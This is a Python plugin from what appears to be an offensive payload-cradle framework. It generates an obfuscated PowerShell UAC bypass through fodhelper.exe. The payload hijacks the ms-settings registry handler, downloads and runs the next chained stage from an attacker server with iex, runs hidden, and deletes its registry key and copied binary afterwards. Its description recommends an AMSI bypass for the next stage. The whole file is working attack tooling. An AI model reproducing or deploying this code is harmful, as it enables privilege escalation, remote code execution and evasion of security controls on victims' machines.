import secrets
import string

from plugins._base import BaseCradlePlugin
from core.models import CradleInstance
from core.obfuscate_getrandom import get_random_obfuscated_string as sgr,helper_powershell_escape as hpe

class PrivescUacFodhelper(BaseCradlePlugin):
    NAME        = "privesc_uac_fodhelper"
    DESCRIPTION = "Privesc UAC Fodhelper - Uses registry key settings for Fodhelper to bypass UAC. Will run the next chained cradle, RECOMMEND AN AMSI BYPASS FOR NEXT CRADLE."
    AUTHOR      = "CyberSecN00b"

    OPTIONS = {
        **BaseCradlePlugin.OPTIONS
    }

    def generate(self, inst: CradleInstance) -> str:
        payload = []
        varname_powershell = ''.join(secrets.choice(string.ascii_uppercase) for i in range(16))

        payload.append(sgr(
f"""
cp (Get-Command powershell.exe).Source C:\\Windows\\Temp\\{varname_powershell}.exe
New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force -Value "C:\\Windows\\Temp\\{varname_powershell}.exe -ep b (New-Object System.Net.WebClient).DownloadString('http://{self._endpoint_registry.server_config['domain']}/{self._endpoint_registry.get_by_ref(inst.options.get("NEXT_CRADLE",0)).uid}')|iex"
New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "DelegateExecute" -Value "" -Force
Start-Process "C:\\Windows\\System32\\fodhelper.exe" -WindowStyle Hidden
Start-Sleep 3
Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force
rm C:\\Windows\\Temp\\{varname_powershell}.exe
""")+"|iex")
        return "\n".join(payload) + "\n"